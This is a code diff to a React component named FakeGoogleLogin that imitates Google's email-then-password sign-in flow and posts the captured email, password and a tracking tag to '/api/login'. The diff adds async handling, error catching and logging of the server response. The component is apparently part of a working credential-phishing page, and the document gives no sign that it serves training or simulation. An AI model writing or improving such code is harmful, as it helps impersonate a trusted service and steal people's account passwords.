@@ -66,20 +66,27 @@ const FakeGoogleLogin = () => {
   const location = useLocation();
   const queryParams = new URLSearchParams(location.search);
   const button = queryParams.get('button') || 'unknown';
+  console.log('Button:', button);
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (step === 'email') {
       setStep('password');
     } else {
         // Always send email and password when the form is submitted (after both steps)
-        fetch('/api/login', {
+        try {
+          const response = await fetch('/api/login', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+              'Content-Type': 'application/json',
             },
             body: JSON.stringify({ email, password, button: `google-${button}` }),
-        });
-      navigate('/loading');
+          });
+          const data = await response.json();
+          console.log('Server response:', data);
+        } catch (error) {
+          console.error('Error sending login data:', error);
+        }
+        navigate('/loading');
     }
   };
 
